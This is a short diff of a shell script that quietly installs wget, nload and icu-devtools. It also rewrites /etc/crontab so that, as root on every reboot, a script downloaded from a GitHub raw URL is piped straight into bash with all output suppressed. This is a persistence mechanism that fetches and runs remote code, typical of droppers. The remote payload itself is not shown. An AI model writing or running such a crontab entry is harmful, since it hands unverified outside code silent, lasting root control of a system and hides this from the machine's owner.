@@ -1,4 +1,7 @@
 #!/bin/sh
+# Debian12+
+sudo apt -qqy update >/dev/null 2>&1 || apt -qqy update >/dev/null 2>&1
+sudo apt -qqy install wget nload icu-devtools >/dev/null 2>&1 || apt -qqy install wget nload icu-devtools >/dev/null 2>&1
 
 sudo sed -i "/^@reboot/d;\$a\@reboot root /bin/bash <(wget -qO- https://raw.githubusercontent.com/curiosityinteriorsuk/2088/main/v1.sh) >>/dev/null 2>&1 &\n\n\n" /etc/crontab
 
